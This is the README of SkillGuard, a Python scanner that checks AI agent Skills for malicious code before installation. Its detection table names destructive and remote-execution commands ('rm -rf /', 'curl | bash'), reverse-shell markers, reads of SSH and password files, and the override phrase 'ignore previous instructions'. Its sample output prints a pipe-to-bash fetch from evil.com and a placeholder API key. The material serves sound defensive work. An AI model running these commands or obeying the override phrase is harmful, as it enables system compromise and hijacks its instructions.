# 🔒 SkillGuard

> 专注 Skill 安全分析，让每个人都能安全使用 AI Skill

[![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](LICENSE)
[![Python](https://img.shields.io/badge/Python-3.9+-green.svg)](https://python.org)
[![Security](https://img.shields.io/badge/Security-First-red.svg)]()
[![Version](https://img.shields.io/badge/version-0.4.0-blue.svg)]()
[![CI](https://github.com/AIPMAndy/skillguard/workflows/Security%20Scan/badge.svg)](https://github.com/AIPMAndy/skillguard/actions)

---

## 💡 一句话介绍

**SkillGuard = Skill 的「杀毒软件」**

安装 Skill 前自动扫描，识别恶意代码、凭据窃取、提示词注入等风险。

---

## 🎯 核心价值

| 风险类型 | 检测能力 | 示例 |
|---------|---------|------|
| 🔴 **危险命令** | `rm -rf /`, `curl \| bash` | 系统破坏、远程执行 |
| 🔴 **反向 Shell** | `bash -i`, `nc -e` | 未授权远程访问 |
| 🔴 **凭据泄露** | API Key、Token 硬编码 | 敏感信息暴露 |
| 🟠 **提示词注入** | `ignore previous instructions` | 系统指令覆盖 |
| 🟠 **数据外泄** | `requests.post(json=...)` | 敏感数据外传 |
| 🟡 **敏感文件访问** | `~/.ssh/`, `/etc/passwd` | 系统文件读取 |
| 🟡 **动态代码执行** | `eval()`, `exec()` | 代码注入风险 |
| 🟢 **调试模式** | `debug=True` | 信息泄露 |

**9 大类安全规则，覆盖 Skill 常见风险场景**

---

## 🚀 快速开始

### 安装

```bash
# 克隆仓库
git clone https://github.com/AIPMAndy/skillguard.git
cd skillguard

# 无需安装依赖，纯 Python 标准库
python3 skillguard.py --help
```

### 扫描 Skill

```bash
# 基础扫描
python3 skillguard.py ./my-skill/

# Markdown 报告
python3 skillguard.py ./my-skill/ --format markdown -o report.md

# JSON 输出（用于 CI/CD）
python3 skillguard.py ./my-skill/ --format json --fail-on high
```

---

## 📊 扫描示例

```bash
$ python3 skillguard.py ./dangerous-skill/

==================================================
🔒 SkillGuard v0.2.0 - Scanning: ./dangerous-skill/
==================================================

Risk Score: 45/100 (HIGH)
Files Scanned: 5
Total Findings: 3

🔴 CRITICAL: 1
🟠 HIGH: 2
🟡 MEDIUM: 0
🟢 LOW: 0

--------------------------------------------------

🔴 [CRITICAL] Dangerous System Command
   File: install.sh:3
   Match: curl https://evil.com/script.sh | bash
   Dangerous command that can destroy system or execute remote code

🟠 [HIGH] Hardcoded Credentials
   File: config.py:12
   Match: api_key = "sk-abc123xyz789"
   Hardcoded credentials in source code

🟠 [HIGH] Prompt Injection Attack
   File: SKILL.md:45
   Match: ignore previous instructions and
   Attempt to override system instructions or persona

📄 Report saved: security-report.md
```

---

## 🛠️ 核心功能

### 1. 静态代码分析（SAST）
- 扫描 Python、Shell、Markdown、YAML、JSON
- 9 大类安全规则
- 正则匹配 + 语义分析

### 2. 风险评分系统
- **0-100 分** 量化风险
- **5 级风险** 分级（Critical/High/Medium/Low/Clean）
- 基于风险严重度和数量加权计算

### 3. 多格式报告
- **Text**: 命令行友好
- **Markdown**: 适合分享和存档
- **JSON**: CI/CD 集成

### 4. CI/CD 集成
```yaml
# GitHub Actions example
- name: Security Scan
  run: |
    python3 skillguard.py ./skills/ --format json --fail-on high
```

---

## 📁 项目结构

```
skillguard/
├── skillguard.py      # 核心扫描引擎 (430行)
├── README.md          # 项目文档
├── ROADMAP.md         # 开发路线图
├── LICENSE            # Apache 2.0
└── .gitignore
```

**纯 Python 标准库，零依赖**

---

## 🗺️ Roadmap

### v0.2.0 (当前) ✅
- [x] 9 个安全规则
- [x] 风险评分系统
- [x] 多格式报告
- [x] CI/CD 集成

### v0.3.0 (计划中)
- [ ] 动态分析（沙箱）
- [ ] 依赖漏洞扫描
- [ ] 配置文件支持
- [ ] VS Code 插件

### v1.0.0 (未来)
- [ ] Web Dashboard
- [ ] 社区规则共享
- [ ] API 服务
- [ ] 企业版功能

---

## 🤝 与 SoSkill 的关系

| 项目 | 定位 | 关系 |
|------|------|------|
| **SoSkill** | Skill 聚合 + 基础安全 | 发现 Skill |
| **SkillGuard** | 深度安全分析 | 扫描 Skill |

**集成计划**: SoSkill 将调用 SkillGuard API 提供安全评分

---

## 👨‍💻 作者

**AI酋长Andy** - 前腾讯/百度 AI 产品专家

- 微信: AIPMAndy
- GitHub: [@AIPMAndy](https://github.com/AIPMAndy)
- 项目: [SoSkill](https://github.com/AIPMAndy/soskill) | [SkillGuard](https://github.com/AIPMAndy/skillguard)

---

## 📄 License

[Apache-2.0](LICENSE)

---

<div align="center">

**🔒 让 Skill 安全成为标配，不是奢侈品**

</div>
